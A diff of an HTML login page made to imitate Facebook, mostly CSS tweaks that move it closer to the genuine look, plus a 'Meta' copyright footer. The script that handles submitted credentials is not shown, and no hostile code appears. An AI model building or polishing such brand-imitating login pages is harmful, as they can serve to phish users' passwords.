@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
 
 <meta charset="UTF-8">
@@ -19,58 +18,70 @@ font-family:Segoe UI, Arial, Helvetica, sans-serif;
 
 body{
 background:#f0f2f5;
+min-height:100vh;
 display:flex;
-flex-direction:column;
 align-items:center;
 justify-content:center;
-height:100vh;
+flex-direction:column;
+padding:20px;
 }
 
 /* TITLE */
 
 .title{
-font-size:48px;
+font-size:40px;
 font-weight:900;
 color:#1877f2;
-margin-bottom:30px;
+margin-bottom:25px;
+text-align:center;
 }
 
-/* LOGIN CARD */
+/* CARD */
 
 .card{
-width:90%;
-max-width:380px;
 background:white;
+width:100%;
+max-width:400px;
 padding:30px;
-border-radius:10px;
-box-shadow:0 8px 25px rgba(0,0,0,0.15);
+border-radius:12px;
+box-shadow:0 12px 35px rgba(0,0,0,0.15);
 text-align:center;
+}
+
+/* ERROR */
+
+.error{
+display:none;
+color:#d93025;
+font-size:14px;
+margin-bottom:12px;
 }
 
 /* INPUT */
 
-input{
+.input{
 width:100%;
-padding:14px;
-margin-bottom:15px;
-border-radius:6px;
+padding:15px;
+border-radius:8px;
 border:1px solid #dddfe2;
 font-size:16px;
+margin-bottom:14px;
+transition:0.2s;
 }
 
-input:focus{
+.input:focus{
 outline:none;
 border-color:#1877f2;
-box-shadow:0 0 0 2px rgba(24,119,242,0.2);
+box-shadow:0 0 0 3px rgba(24,119,242,0.15);
 }
 
 /* LOGIN BUTTON */
 
 .login-btn{
 width:100%;
-padding:14px;
+padding:15px;
 border:none;
-border-radius:6px;
+border-radius:8px;
 background:#1877f2;
 color:white;
 font-size:17px;
@@ -83,27 +94,16 @@ transition:0.2s;
 background:#166fe5;
 }
 
-/* LOADING STATE */
-
 .login-btn.loading{
 background:#9bbcf5;
 cursor:not-allowed;
-}
-
-/* ERROR MESSAGE */
-
-.error{
-display:none;
-color:#d93025;
-font-size:14px;
-margin-bottom:10px;
 }
 
 /* DIVIDER */
 
 .divider{
 height:1px;
-background:#ddd;
+background:#e4e6eb;
 margin:20px 0;
 }
 
@@ -111,25 +111,25 @@ margin:20px 0;
 
 .create-btn{
 width:100%;
-padding:12px;
+padding:13px;
 border:none;
-border-radius:6px;
-background:#2b49f7;
+border-radius:8px;
+background:#42b72a;
 color:white;
 font-size:16px;
 font-weight:bold;
 cursor:pointer;
+transition:0.2s;
 }
 
 .create-btn:hover{
-background:#206fa4;
+background:#36a420;
 }
 
 /* FOOTER */
 
 .site-footer{
-position:absolute;
-bottom:25px;
+margin-top:40px;
 text-align:center;
 font-size:13px;
 color:#737373;
@@ -141,17 +141,14 @@ margin:0 8px;
 cursor:pointer;
 }
 
-.footer-bottom{
-position:absolute;
-bottom:5px;
-font-size:12px;
-color:#8a8d91;
-text-align:center;
-width:100%;
-}
-
 .languages{
 margin-bottom:8px;
+}
+
+.footer-bottom{
+margin-top:10px;
+font-size:12px;
+color:#8a8d91;
 }
 
 </style>
@@ -166,9 +163,9 @@ margin-bottom:8px;
 
 <div id="error" class="error">Login failed. Please try again.</div>
 
-<input id="email" placeholder="Email address">
+<input id="email" class="input" placeholder="Mobile number or email">
 
-<input id="password" type="password" placeholder="Password">
+<input id="password" type="password" class="input" placeholder="Password">
 
 <button id="loginBtn" class="login-btn" onclick="login()">Log In</button>
 
@@ -198,10 +195,10 @@ margin-bottom:8px;
 <span>Careers</span>
 </div>
 
-</div>
-
 <div class="footer-bottom">
 © 2026 Meta · Privacy · Terms · Help
+</div>
+
 </div>
 
 <script>
@@ -263,5 +260,4 @@ btn.innerText="Log In"
 </script>
 
 </body>
-
 </html>
